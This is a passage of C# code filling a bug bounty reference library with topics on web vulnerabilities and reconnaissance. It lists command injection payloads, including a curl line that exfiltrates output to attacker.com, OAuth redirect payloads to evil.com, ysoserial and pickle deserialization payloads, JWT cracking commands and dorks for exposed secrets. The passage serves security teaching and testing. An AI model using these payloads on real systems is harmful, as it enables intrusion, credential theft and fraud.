                Tools = new List<string> { "Burp Suite", "tplmap", "SSTImap" }
            };

            libraryTopics["Vuln_Command"] = new LibraryTopic
            {
                Tag = "Vuln_Command",
                Category = "Vulnerabilities",
                Title = "Command Injection Deep Dive",
                Subtitle = "OS Command Injection Attacks",
                Content = "Command injection allows attackers to execute arbitrary OS commands on the host server. It occurs when user-supplied input is passed to a system shell command without proper sanitization.\n\nHow Command Injection Works: Applications that use system(), exec(), popen(), shell_exec() (PHP), or os.system() (Python) with user input are vulnerable if the input is not properly sanitized. Attackers append shell metacharacters to chain additional commands.\n\nShell Metacharacters:\n; - Execute commands sequentially\n| - Pipe: output of first is input to second\n& - Run in background\n&& - Run second if first succeeds\n|| - Run second if first fails\n` ` - Command substitution (backticks)\n$() - Command substitution\n\nCommand Injection vs Code Injection: Command injection executes OS commands. Code injection executes application code. Both can lead to full system compromise.\n\nBlind Command Injection: No output is returned. Detect via: time delays (sleep 5), DNS callbacks (nslookup), out-of-band HTTP requests, writing files.\n\nImpact: Command injection is typically critical as it allows full server compromise.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "; id", Explanation = "Append id command with semicolon. If user ID appears, command injection exists." },
                    new CommandItem { Text = "| id", Explanation = "Pipe to id command." },
                    new CommandItem { Text = "& id", Explanation = "Background execution then id." },
                    new CommandItem { Text = "`id`", Explanation = "Backtick command substitution." },
                    new CommandItem { Text = "$(id)", Explanation = "Dollar sign command substitution." },
                    new CommandItem { Text = "; sleep 5", Explanation = "Time-based blind detection. If page delays 5 seconds, injection exists." },
                    new CommandItem { Text = "| nslookup COLLABORATOR_URL", Explanation = "Out-of-band DNS detection for blind command injection." },
                    new CommandItem { Text = "; curl http://attacker.com/$(whoami)", Explanation = "Exfiltrate command output via HTTP request." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Find features that execute system commands", Code = "Ping, traceroute, DNS lookup, image conversion" },
                    new StepItem { Number = 2, Description = "Test with basic metacharacters", Code = "; id" },
                    new StepItem { Number = 3, Description = "If no output, test time-based", Code = "; sleep 5" },
                    new StepItem { Number = 4, Description = "Use Burp Collaborator for OOB detection", Code = "; nslookup COLLABORATOR" },
                    new StepItem { Number = 5, Description = "Escalate to reverse shell", Code = "Document RCE capability" }
                },
                Tools = new List<string> { "Burp Suite", "Burp Collaborator", "commix", "interactsh" }
            };

            libraryTopics["Vuln_JWT"] = new LibraryTopic
            {
                Tag = "Vuln_JWT",
                Category = "Vulnerabilities",
                Title = "JWT Attacks Complete Guide",
                Subtitle = "JSON Web Token Vulnerabilities",
                Content = "JWT (JSON Web Token) is a standard for securely transmitting information between parties. JWT vulnerabilities are common and can lead to authentication bypass and privilege escalation.\n\nJWT Structure: Header.Payload.Signature. Each part is Base64URL encoded. The header specifies the algorithm, the payload contains claims, and the signature verifies integrity.\n\nCommon JWT Vulnerabilities:\n1. None algorithm attack - Change alg to 'none', remove signature\n2. RS256 to HS256 attack - Use public key as HMAC secret\n3. Weak secret - Brute force the HMAC secret\n4. Algorithm confusion - Exploit incorrect algorithm handling\n5. Kid injection - SQL injection in kid header\n6. Header injection - JKU/X5U header to custom key server\n7. Expired tokens accepted\n8. Sensitive data in payload (not encrypted by default)\n\nJWT Tools: jwt.io for decoding, jwt_tool for attacks, Burp JWT Editor extension for manipulation.\n\nJWT Security Best Practices: Use RS256 for public/private key signing, validate algorithm explicitly, use short expiry times, never put sensitive data in payload.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "python3 jwt_tool.py TOKEN -X a", Explanation = "Test for none algorithm attack using jwt_tool." },
                    new CommandItem { Text = "python3 jwt_tool.py TOKEN -C -d wordlist.txt", Explanation = "Brute force JWT secret using wordlist." },
                    new CommandItem { Text = "python3 jwt_tool.py TOKEN -X s", Explanation = "Test RS256 to HS256 confusion attack." },
                    new CommandItem { Text = "echo 'PAYLOAD' | base64 -d", Explanation = "Decode JWT payload. JWT is just Base64URL encoded." },
                    new CommandItem { Text = "hashcat -a 0 -m 16500 jwt_hash.txt wordlist.txt", Explanation = "Crack JWT secret with hashcat. Mode 16500 is for JWT." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Decode the JWT at jwt.io", Code = "Identify algorithm and claims" },
                    new StepItem { Number = 2, Description = "Test none algorithm", Code = "Change alg to none, remove signature" },
                    new StepItem { Number = 3, Description = "Try to brute force the secret", Code = "python3 jwt_tool.py TOKEN -C -d rockyou.txt" },
                    new StepItem { Number = 4, Description = "Test algorithm confusion if RSA", Code = "RS256 to HS256 with public key" },
                    new StepItem { Number = 5, Description = "Check for sensitive data in payload", Code = "PII, internal info in JWT claims" }
                },
                Tools = new List<string> { "jwt_tool", "Burp JWT Editor", "jwt.io", "hashcat" }
            };

            libraryTopics["Vuln_OAuth"] = new LibraryTopic
            {
                Tag = "Vuln_OAuth",
                Category = "Vulnerabilities",
                Title = "OAuth Misconfigurations",
                Subtitle = "Finding OAuth 2.0 Security Flaws",
                Content = "OAuth 2.0 is an authorization framework that enables third-party applications to access user accounts without exposing credentials. Misconfigurations in OAuth implementations can lead to account takeover, data exposure, and privilege escalation.\n\nOAuth Flow: User logs in with identity provider (Google, Facebook). Identity provider redirects to application with authorization code. Application exchanges code for access token. Application accesses user data with token.\n\nCommon OAuth Vulnerabilities:\n1. Redirect URI manipulation - Send code to attacker-controlled URL\n2. Missing state parameter - CSRF in OAuth flow\n3. Open redirect chaining - Bypass redirect_uri whitelist\n4. Authorization code leakage via Referer\n5. Token leakage in URL\n6. Access token in logs\n7. Insufficient scope validation\n8. PKCE bypass\n\nRedirect URI Bypass: If the application validates redirect_uri insufficiently, an attacker can send the authorization code to their server. Bypass techniques: adding path suffix, subdomain attack, URI parsing differences.\n\nState Parameter: Must be unique and tied to the user's session. If missing or predictable, CSRF attacks against the OAuth flow are possible.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "https://target.com/oauth/authorize?client_id=X&redirect_uri=https://evil.com&response_type=code", Explanation = "Test if redirect_uri can be changed to attacker-controlled URL." },
                    new CommandItem { Text = "https://target.com/oauth/authorize?client_id=X&redirect_uri=https://target.com@evil.com", Explanation = "URI confusion bypass - @ character before hostname." },
                    new CommandItem { Text = "https://target.com/oauth/authorize?client_id=X&redirect_uri=https://evil.target.com", Explanation = "Subdomain bypass if wildcard is used." },
                    new CommandItem { Text = "Remove state parameter from OAuth request", Explanation = "Test if state parameter is required. If not, CSRF possible." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Map the complete OAuth flow", Code = "Capture all requests in Burp" },
                    new StepItem { Number = 2, Description = "Test redirect_uri manipulation", Code = "Change to evil.com and check if it accepts" },
                    new StepItem { Number = 3, Description = "Check state parameter", Code = "Remove state and see if auth still works" },
                    new StepItem { Number = 4, Description = "Test redirect_uri bypass techniques", Code = "Path traversal, subdomain, @ character" },
                    new StepItem { Number = 5, Description = "Check token exposure", Code = "Is token in URL, logs, Referer?" }
                },
                Tools = new List<string> { "Burp Suite", "OAuth Tester" }
            };

            libraryTopics["Vuln_GraphQL"] = new LibraryTopic
            {
                Tag = "Vuln_GraphQL",
                Category = "Vulnerabilities",
                Title = "GraphQL Vulnerabilities",
                Subtitle = "Security Testing for GraphQL APIs",
                Content = "GraphQL is an alternative to REST APIs that allows clients to request exactly the data they need. GraphQL introduces unique security challenges not present in REST APIs.\n\nGraphQL Security Issues:\n1. Introspection enabled in production - Reveals entire schema\n2. Excessive data exposure - Requesting unauthorized fields\n3. Missing authorization - Any user can query any data\n4. Batching attacks - Send many queries in one request to bypass rate limiting\n5. Injection via GraphQL arguments - SQLi, command injection\n6. Denial of service via complex queries\n7. Information disclosure through errors\n\nIntrospection: Allows querying the schema to discover all available types, queries, and mutations. Always enabled by default. In production, should be disabled or restricted.\n\nGraphQL Authorization: Authorization must be implemented at the resolver level. Some implementations check auth globally but forget to protect individual resolvers.\n\nGraphQL Injection: GraphQL arguments can be vulnerable to the same injection attacks as REST parameters - SQL injection, SSRF, command injection.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "{__schema{types{name}}}", Explanation = "GraphQL introspection query to list all types in the schema." },
                    new CommandItem { Text = "{__schema{queryType{fields{name description}}}}", Explanation = "List all available queries and their descriptions." },
                    new CommandItem { Text = "curl -X POST 'https://target.com/graphql' -H 'Content-Type: application/json' -d '{\"query\":\"{users{id email password}}\"}'", Explanation = "Test for unauthorized data access via GraphQL." },
                    new CommandItem { Text = "python3 graphw00f.py -f -t https://target.com/graphql", Explanation = "Fingerprint and detect GraphQL implementation." },
                    new CommandItem { Text = "python3 graphql-cop.py -t https://target.com/graphql", Explanation = "Security audit of GraphQL implementation." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Find the GraphQL endpoint", Code = "/graphql, /api/graphql, /gql" },
                    new StepItem { Number = 2, Description = "Run introspection query", Code = "{__schema{types{name}}}" },
                    new StepItem { Number = 3, Description = "Map all queries and mutations", Code = "Use InQL Burp extension" },
                    new StepItem { Number = 4, Description = "Test each query for authorization", Code = "Access data belonging to other users" },
                    new StepItem { Number = 5, Description = "Test for injection in arguments", Code = "SQLi, SSRF, command injection" }
                },
                Tools = new List<string> { "Burp InQL extension", "graphw00f", "graphql-cop", "Altair", "GraphiQL" }
            };

            libraryTopics["Vuln_Race"] = new LibraryTopic
            {
                Tag = "Vuln_Race",
                Category = "Vulnerabilities",
                Title = "Race Conditions Guide",
                Subtitle = "Finding and Exploiting Race Conditions",
                Content = "Race conditions occur when the behavior of software depends on the sequence or timing of events that are not properly controlled. In web applications, they can be exploited to bypass business logic, double-spend funds, bypass rate limits, or access resources multiple times.\n\nHow Race Conditions Work: When a server processes concurrent requests, the check-then-act sequence can be exploited. Example: Check if coupon is valid, then mark as used. If two requests arrive simultaneously, both pass the check before either marks it used.\n\nCommon Race Condition Scenarios:\n1. Coupon/gift card reuse\n2. Double-spend in payment systems\n3. Bypassing single-use tokens\n4. Rate limit bypass\n5. Voting/like manipulation\n6. File upload race conditions\n7. Session creation race conditions\n\nBurp Suite Turbo Intruder: The go-to tool for race condition testing. Allows sending many requests simultaneously with precise timing control.\n\nHTTP/2 Single Packet Attack: HTTP/2 multiplexing allows sending multiple requests in a single TCP packet, eliminating network jitter. Significantly improves race condition reliability.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "# Burp Suite: Send request to Turbo Intruder\n# Use race_single_packet_attack.py template", Explanation = "Turbo Intruder is the best tool for web race conditions." },
                    new CommandItem { Text = "for i in {1..10}; do curl -X POST 'https://target.com/redeem' -d 'code=PROMO50' & done", Explanation = "Bash parallel requests for basic race condition test." },
                    new CommandItem { Text = "python3 -c \"import threading, requests; [threading.Thread(target=lambda: requests.post('https://target.com/redeem', data={'code':'PROMO'})).start() for _ in range(10)]\"", Explanation = "Python parallel requests for race condition testing." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Identify single-use operations", Code = "Coupons, gift cards, free trials, votes" },
                    new StepItem { Number = 2, Description = "Set up Turbo Intruder in Burp Suite", Code = "Right-click request > Extensions > Send to Turbo Intruder" },
                    new StepItem { Number = 3, Description = "Configure single-packet attack", Code = "Use HTTP/2 race condition template" },
                    new StepItem { Number = 4, Description = "Send 10-50 simultaneous requests", Code = "Observe if operation succeeds multiple times" },
                    new StepItem { Number = 5, Description = "Document the duplicated action as evidence", Code = "Show multiple successful redemptions" }
                },
                Tools = new List<string> { "Burp Suite Turbo Intruder", "Python threading", "curl" }
            };

            libraryTopics["Vuln_Deser"] = new LibraryTopic
            {
                Tag = "Vuln_Deser",
                Category = "Vulnerabilities",
                Title = "Deserialization Attacks",
                Subtitle = "Insecure Deserialization Exploitation",
                Content = "Insecure deserialization occurs when an application deserializes untrusted data without sufficient validation. Attackers who can control the deserialized data can manipulate application logic or achieve remote code execution.\n\nHow Deserialization Works: Serialization converts objects to a byte stream for storage or transmission. Deserialization is the reverse. If an attacker can control the serialized data (in a cookie, parameter, or request body), they may be able to manipulate the reconstructed object or trigger dangerous code paths during deserialization.\n\nLanguage-Specific Issues:\nJava: Java serialization (0xaced magic bytes), vulnerable gadget chains (ysoserial)\nPHP: unserialize() with magic methods (__wakeup, __destruct)\nPython: pickle deserialization\nRuby: YAML deserialization\n.NET: BinaryFormatter, XmlSerializer\n\nGadget Chains: Deserialization gadgets are existing classes in the application's classpath that, when deserialized in a specific sequence, execute attacker-controlled code.\n\nFinding Deserialization: Look for base64-encoded data in cookies, custom serialized data, requests with binary data, Java serialization magic bytes (rO0AB).",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "java -jar ysoserial.jar CommonsCollections6 'id' | base64", Explanation = "Generate Java deserialization payload using ysoserial." },
                    new CommandItem { Text = "python3 -c \"import pickle,os; print(pickle.dumps({'x': os.system}))\"", Explanation = "Python pickle deserialization proof of concept." },
                    new CommandItem { Text = "echo 'rO0AB' | base64 -d | xxd | head", Explanation = "Check for Java serialization magic bytes in base64 data." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Identify serialized data in requests", Code = "Cookies, parameters, request body" },
                    new StepItem { Number = 2, Description = "Identify the serialization format", Code = "Java (rO0AB), PHP (a:, O:), Python pickle" },
                    new StepItem { Number = 3, Description = "Generate appropriate payload", Code = "ysoserial for Java, custom for PHP/Python" },
                    new StepItem { Number = 4, Description = "Test with OOB payload first", Code = "DNS callback to confirm vulnerability" },
                    new StepItem { Number = 5, Description = "Escalate to RCE with command execution", Code = "id, whoami commands" }
                },
                Tools = new List<string> { "ysoserial", "GadgetInspector", "Burp Suite", "PHPGGC" }
            };

            libraryTopics["Vuln_Logic"] = new LibraryTopic
            {
                Tag = "Vuln_Logic",
                Category = "Vulnerabilities",
                Title = "Business Logic Flaws",
                Subtitle = "Finding Logic-Based Vulnerabilities",
                Content = "Business logic vulnerabilities are flaws in the design and implementation of an application that allow attackers to manipulate legitimate functionality to achieve malicious goals. Unlike technical vulnerabilities, these require understanding how the application is intended to work.\n\nWhy Logic Flaws Are Special: Logic flaws are unique to each application. Automated scanners cannot find them. They require understanding the application's business rules and finding ways to violate them.\n\nCommon Business Logic Flaws:\n1. Price manipulation (negative quantities, float prices)\n2. Workflow bypass (skip steps in a multi-step process)\n3. Privilege escalation through parameter manipulation\n4. Coupon stacking or abuse\n5. Account enumeration through different responses\n6. Password reset logic flaws\n7. Balance manipulation in financial applications\n8. API rate limit bypass through alternative endpoints\n9. Skipping payment in e-commerce\n10. Bypassing age verification\n\nFinding Logic Flaws: Thoroughly understand the intended functionality. Think about what a malicious user would want to do and whether the application prevents it. Test edge cases: negative values, zero, maximum values, special characters.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "POST /checkout quantity=-1&price=9.99", Explanation = "Test negative quantity to get credit instead of charges." },
                    new CommandItem { Text = "POST /checkout price=0.01", Explanation = "Manipulate price parameter to purchase for minimal cost." },
                    new CommandItem { Text = "GET /step3 (skip step 2)", Explanation = "Skip payment step by navigating directly to order confirmation." },
                    new CommandItem { Text = "Apply same coupon code 10 times rapidly", Explanation = "Race condition to stack single-use coupons." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Fully understand the intended workflow", Code = "Map every step and feature" },
                    new StepItem { Number = 2, Description = "Think about what you'd want to exploit as an attacker", Code = "Free goods, privilege, access" },
                    new StepItem { Number = 3, Description = "Test edge cases on every parameter", Code = "Negative, zero, max values" },
                    new StepItem { Number = 4, Description = "Try skipping steps in workflows", Code = "Go to step 3 without completing step 2" },
                    new StepItem { Number = 5, Description = "Test parameter manipulation in transactions", Code = "Price, quantity, discount params" },
                    new StepItem { Number = 6, Description = "Try applying the same coupon multiple times", Code = "Race condition or re-application" }
                },
                Tools = new List<string> { "Burp Suite", "curl", "Browser DevTools" }
            };
        }

       
    
        private void InitializeReconnaissance()
        {
            libraryTopics["Recon_Subdomain"] = new LibraryTopic
            {
                Tag = "Recon_Subdomain",
                Category = "Reconnaissance",
                Title = "Subdomain Enumeration Complete Guide",
                Subtitle = "Discovering Hidden Attack Surface",
                Content = "Subdomain enumeration is one of the most important recon skills. A target's main domain is just the tip of the iceberg. Hundreds of subdomains can reveal APIs, admin panels, development environments, and forgotten services with fewer security controls.\n\nPassive vs Active Enumeration:\nPassive: Using third-party services without directly querying the target (crt.sh, VirusTotal, SecurityTrails). Stealthier and leaves no traces on target.\nActive: Directly querying target DNS servers, brute forcing subdomains. More thorough but leaves traces.\n\nKey Data Sources:\n1. Certificate Transparency Logs (crt.sh, censys)\n2. DNS brute force with wordlists\n3. Web archives (Wayback Machine)\n4. Search engines (Google, Bing)\n5. VirusTotal passive DNS\n6. Shodan, Censys, FOFA\n7. SecurityTrails, PassiveTotal\n8. GitHub, GitLab code repositories\n9. ASN enumeration\n10. DNS zone transfers (rare)\n\nSubdomain Takeover: After finding subdomains, check if any are vulnerable to takeover. This occurs when a CNAME points to an unclaimed third-party resource.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "subfinder -d target.com -all -o subdomains.txt", Explanation = "Passive subdomain enumeration using all sources." },
                    new CommandItem { Text = "amass enum -passive -d target.com -o amass_subs.txt", Explanation = "Amass passive enumeration." },
                    new CommandItem { Text = "curl -s 'https://crt.sh/?q=%.target.com&output=json' | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u", Explanation = "Certificate transparency enumeration via crt.sh API." },
                    new CommandItem { Text = "assetfinder --subs-only target.com", Explanation = "Fast passive enumeration using assetfinder." },
                    new CommandItem { Text = "gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50", Explanation = "Active DNS brute force enumeration." },
                    new CommandItem { Text = "dnsx -d target.com -w subdomains.txt -a -aaaa -cname -mx -ns -o resolved.txt", Explanation = "Resolve subdomain list with multiple record types." },
                    new CommandItem { Text = "cat all_subs.txt | httpx -silent -o live_subs.txt", Explanation = "Filter live web-accessible subdomains." },
                    new CommandItem { Text = "subzy run --targets live_subs.txt", Explanation = "Check all live subdomains for takeover vulnerability." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Passive enumeration with multiple tools", Code = "subfinder + amass + assetfinder" },
                    new StepItem { Number = 2, Description = "Certificate transparency enumeration", Code = "crt.sh, censys" },
                    new StepItem { Number = 3, Description = "Active DNS brute force", Code = "gobuster dns with top wordlists" },
                    new StepItem { Number = 4, Description = "Combine and deduplicate all results", Code = "cat *.txt | sort -u > all_subs.txt" },
                    new StepItem { Number = 5, Description = "Resolve and filter live subdomains", Code = "httpx or dnsx" },
                    new StepItem { Number = 6, Description = "Screenshot live subdomains", Code = "aquatone or gowitness" },
                    new StepItem { Number = 7, Description = "Check for subdomain takeover", Code = "subzy or nuclei takeover templates" }
                },
                Tools = new List<string> { "subfinder", "amass", "assetfinder", "gobuster", "dnsx", "httpx", "subzy", "aquatone", "findomain" }
            };

            libraryTopics["Recon_Ports"] = new LibraryTopic
            {
                Tag = "Recon_Ports",
                Category = "Reconnaissance",
                Title = "Port Scanning Strategies",
                Subtitle = "Efficient Port Scanning for Bug Bounty",
                Content = "Port scanning is essential to discover all services running on target hosts. Different scanning strategies balance speed, coverage, and stealth. For bug bounty, you want thorough coverage while respecting rate limits.\n\nScanning Strategy: Don't just scan common ports. Services on non-standard ports (admin panels on 8888, databases on random high ports) are often less secured because people assume they won't be found.\n\nMasscan vs Nmap: Masscan is extremely fast but provides less information. Nmap is slower but more thorough with version detection and NSE scripts. Best practice: Use masscan for fast initial discovery, then Nmap on discovered open ports for detailed information.\n\nRustscan: Written in Rust, Rustscan can scan all 65535 ports in seconds, then automatically passes results to Nmap for detailed scanning. Best of both worlds.\n\nIPv4 vs IPv6: Remember to scan IPv6 addresses if the target has AAAA records. Services accessible only via IPv6 may have different security postures.\n\nRate Limiting: Bug bounty programs prohibit aggressive scanning that causes service disruption. Always use reasonable rate limits and avoid scanning out-of-scope hosts.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "nmap -T4 --top-ports 1000 target.com", Explanation = "Fast scan of 1000 most common ports." },
                    new CommandItem { Text = "nmap -p- -T4 target.com", Explanation = "Scan all 65535 ports. Slow but comprehensive." },
                    new CommandItem { Text = "masscan -p1-65535 target.com --rate=1000 -oX masscan.xml", Explanation = "Masscan all ports at 1000 packets/sec. Very fast." },
                    new CommandItem { Text = "rustscan -a target.com -- -sV -sC", Explanation = "Rustscan finds open ports fast, then runs Nmap for details." },
                    new CommandItem { Text = "nmap -sV -p $(cat open_ports.txt | tr '\\n' ',') target.com", Explanation = "Run detailed nmap only on previously discovered open ports." },
                    new CommandItem { Text = "nmap -sU --top-ports 200 target.com", Explanation = "UDP scan top 200 ports." },
                    new CommandItem { Text = "cat subdomains.txt | xargs -P 10 -I {} nmap --top-ports 100 {}", Explanation = "Parallel port scan of multiple subdomains." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Quick scan all ports with masscan or rustscan", Code = "masscan -p1-65535 target.com --rate=1000" },
                    new StepItem { Number = 2, Description = "Version detection on open ports with nmap", Code = "nmap -sV -p 22,80,443,8080 target.com" },
                    new StepItem { Number = 3, Description = "Run NSE scripts on relevant services", Code = "nmap --script=http-headers,http-methods -p 80,443 target.com" },
                    new StepItem { Number = 4, Description = "Scan UDP ports for DNS, SNMP, etc", Code = "nmap -sU --top-ports 100 target.com" },
                    new StepItem { Number = 5, Description = "Save all results", Code = "nmap -oA port_scan target.com" }
                },
                Tools = new List<string> { "nmap", "masscan", "rustscan", "unicornscan", "zmap" }
            };

            libraryTopics["Recon_Tech"] = new LibraryTopic
            {
                Tag = "Recon_Tech",
                Category = "Reconnaissance",
                Title = "Technology Detection Methods",
                Subtitle = "Fingerprinting Web Technologies",
                Content = "Identifying the technology stack a target uses is critical for focusing your testing. Knowing the web framework, server, CMS, and JavaScript libraries helps you search for version-specific vulnerabilities and apply appropriate test cases.\n\nWhy Technology Detection Matters: WordPress sites have different attack surfaces than custom Node.js apps. Apache Tomcat misconfigurations differ from Nginx. PHP applications have different vulnerability classes than Java apps. Technology fingerprinting focuses your efforts.\n\nTechnology Detection Methods:\n1. HTTP response headers (Server, X-Powered-By)\n2. Cookie names (PHPSESSID=PHP, JSESSIONID=Java)\n3. HTML source code patterns\n4. JavaScript file paths and library names\n5. Error messages revealing framework\n6. URL patterns (/wp-admin = WordPress)\n7. File extensions (.php, .asp, .jsp)\n8. Browser extensions (Wappalyzer)\n\nVersion Detection: Knowing exact versions allows checking CVE databases for known vulnerabilities. nmap -sV, Wappalyzer, and HTTP headers often reveal versions.\n\nCMS Detection: WordPress, Joomla, Drupal, and Magento have specific tools (wpscan, droopescan, joomscan) that automate vulnerability scanning.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "whatweb -a 3 https://target.com", Explanation = "Comprehensive technology detection." },
                    new CommandItem { Text = "curl -I https://target.com | grep -i 'server\\|x-powered-by\\|x-generator'", Explanation = "Quick header-based technology detection." },
                    new CommandItem { Text = "wpscan --url https://target.com -e ap,u,t", Explanation = "WordPress scanner. Enumerates plugins, users, and themes." },
                    new CommandItem { Text = "joomscan -u https://target.com", Explanation = "Joomla vulnerability scanner." },
                    new CommandItem { Text = "droopescan scan drupal -u https://target.com", Explanation = "Drupal vulnerability scanner." },
                    new CommandItem { Text = "nmap -sV --script=http-generator target.com", Explanation = "Detect CMS and generators via Nmap NSE." },
                    new CommandItem { Text = "python3 CMSeeK.py -u https://target.com", Explanation = "Multi-CMS detection and fingerprinting tool." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Check HTTP headers for technology hints", Code = "curl -I target.com" },
                    new StepItem { Number = 2, Description = "Run Whatweb for comprehensive detection", Code = "whatweb target.com" },
                    new StepItem { Number = 3, Description = "Install Wappalyzer browser extension for real-time detection", Code = "Browse target with Wappalyzer" },
                    new StepItem { Number = 4, Description = "Check for CMS indicators", Code = "/wp-admin, /wp-content (WordPress); /administrator (Joomla)" },
                    new StepItem { Number = 5, Description = "Run CMS-specific scanners if detected", Code = "wpscan, joomscan, droopescan" }
                },
                Tools = new List<string> { "WhatWeb", "Wappalyzer", "BuiltWith", "WPScan", "CMSeeK", "joomscan", "droopescan" }
            };

            libraryTopics["Recon_Dorks"] = new LibraryTopic
            {
                Tag = "Recon_Dorks",
                Category = "Reconnaissance",
                Title = "Google Dorking Encyclopedia",
                Subtitle = "Advanced Search Operators for Bug Hunting",
                Content = "Google Dorking uses advanced search operators to find specific information indexed by search engines. For bug hunters, dorks help discover exposed sensitive files, login pages, admin panels, and information that shouldn't be publicly accessible.\n\nCore Google Operators:\nsite: - Limit results to specific domain\nfiletype: - Search for specific file types\ninurl: - Search for URLs containing specific strings\nintitle: - Search in page titles\nintext: - Search in page text\ncache: - View Google's cached version\nlink: - Find pages linking to URL\nrelated: - Find similar pages\n\nCombining Operators: The power comes from combining operators. site:target.com filetype:pdf intitle:confidential searches for confidential PDFs on the target.\n\nCommon Bug Bounty Dorks:\n- site:target.com inurl:admin finds admin panels\n- site:target.com filetype:sql finds SQL files\n- site:target.com inurl:api finds API endpoints\n- site:target.com filetype:env finds .env files\n- site:target.com inurl:test finds test environments\n- site:github.com target.com finds GitHub repos\n\nGhDB: The Google Hacking Database (GHDB) on exploit-db.com contains thousands of pre-built dorks for various targets.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "site:target.com filetype:pdf", Explanation = "Find all PDF files indexed on the target domain." },
                    new CommandItem { Text = "site:target.com inurl:admin", Explanation = "Find admin panel URLs." },
                    new CommandItem { Text = "site:target.com inurl:login", Explanation = "Find login pages." },
                    new CommandItem { Text = "site:target.com filetype:sql", Explanation = "Find exposed SQL database files." },
                    new CommandItem { Text = "site:target.com intext:\"api_key\"", Explanation = "Find pages containing API keys." },
                    new CommandItem { Text = "site:target.com inurl:dev OR inurl:test OR inurl:staging", Explanation = "Find development and staging environments." },
                    new CommandItem { Text = "site:github.com \"target.com\" \"password\"", Explanation = "Find GitHub repositories mentioning target with password." },
                    new CommandItem { Text = "site:pastebin.com target.com", Explanation = "Find target mentions in Pastebin (data dumps, leaked credentials)." },
                    new CommandItem { Text = "site:target.com ext:bak OR ext:backup OR ext:old", Explanation = "Find backup files." },
                    new CommandItem { Text = "site:target.com inurl:config", Explanation = "Find configuration file paths." },
                    new CommandItem { Text = "site:target.com \"index of\"", Explanation = "Find directory listing pages." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Start with basic site: operator", Code = "site:target.com" },
                    new StepItem { Number = 2, Description = "Find admin and login pages", Code = "site:target.com inurl:admin OR inurl:login" },
                    new StepItem { Number = 3, Description = "Search for sensitive files", Code = "site:target.com filetype:sql OR filetype:env OR filetype:bak" },
                    new StepItem { Number = 4, Description = "Find subdomains", Code = "site:*.target.com" },
                    new StepItem { Number = 5, Description = "Search GitHub for target mentions", Code = "site:github.com target.com" },
                    new StepItem { Number = 6, Description = "Check GHDB for relevant dorks", Code = "https://www.exploit-db.com/google-hacking-database" }
                },
                Tools = new List<string> { "Google", "Bing", "DorkSearch", "GHDB", "Shodan", "Censys" }
            };

            libraryTopics["Recon_GitHub"] = new LibraryTopic
            {
                Tag = "Recon_GitHub",
                Category = "Reconnaissance",
                Title = "GitHub Reconnaissance Guide",
                Subtitle = "Finding Secrets in Code Repositories",
                Content = "GitHub is a goldmine for bug hunters. Developers often accidentally commit API keys, passwords, private keys, and internal URLs to public repositories. Even private repositories may become public accidentally. Historical commits may contain secrets that were deleted but remain in git history.\n\nWhat to Look For:\n1. API keys and tokens\n2. Database credentials\n3. AWS/cloud credentials\n4. Private RSA keys\n5. Internal IP addresses and URLs\n6. Hardcoded passwords\n7. Environment configuration files\n8. Encryption keys and secrets\n\nGitHub Search Operators:\n- org:targetcompany - Search within organization\n- user:username - Search user's repositories\n- filename:.env - Find .env files\n- extension:pem private - Find private key files\n- 'target.com' password - Find repos mentioning target with passwords\n\nSearching Git History: Even after a secret is deleted, it remains in git history. git log and git show can reveal historical commits. Tools like truffleHog and gitleaks scan entire history automatically.\n\nGitHub Dorking: Combining GitHub search with specific keywords finds exposed secrets faster.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "site:github.com org:targetcompany password", Explanation = "Google dork for passwords in target's GitHub org." },
                    new CommandItem { Text = "site:github.com \"target.com\" \"api_key\"", Explanation = "Find API keys mentioning target domain." },
                    new CommandItem { Text = "trufflehog git https://github.com/target/repo", Explanation = "Scan entire git history for secrets." },
                    new CommandItem { Text = "gitleaks detect --source=. --report-path=gitleaks.json", Explanation = "Scan cloned repo for exposed secrets." },
                    new CommandItem { Text = "git log --all --full-history -- '*.env'", Explanation = "Find .env files in git history." },
                    new CommandItem { Text = "git log -p --all | grep -i 'password\\|api_key\\|secret' | head -50", Explanation = "Search git history for sensitive keywords." },
                    new CommandItem { Text = "github-dorks.py -u targetcompany", Explanation = "Automated GitHub dorking for a target organization." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Search GitHub for target organization", Code = "github.com/org/targetcompany" },
                    new StepItem { Number = 2, Description = "Use GitHub search operators", Code = "org:targetcompany filename:.env" },
                    new StepItem { Number = 3, Description = "Search for secrets in public repos", Code = "truffleHog on all public repos" },
                    new StepItem { Number = 4, Description = "Check employee personal GitHub accounts", Code = "Search for target domain in personal repos" },
                    new StepItem { Number = 5, Description = "Look at git history of interesting files", Code = "git log --all -- filename" },
                    new StepItem { Number = 6, Description = "Set up GitHub alerts for new leaks", Code = "GitHub notifications for new commits mentioning target" }
                },
                Tools = new List<string> { "truffleHog", "gitleaks", "gitrob", "GitHound", "github-dorks" }
            };

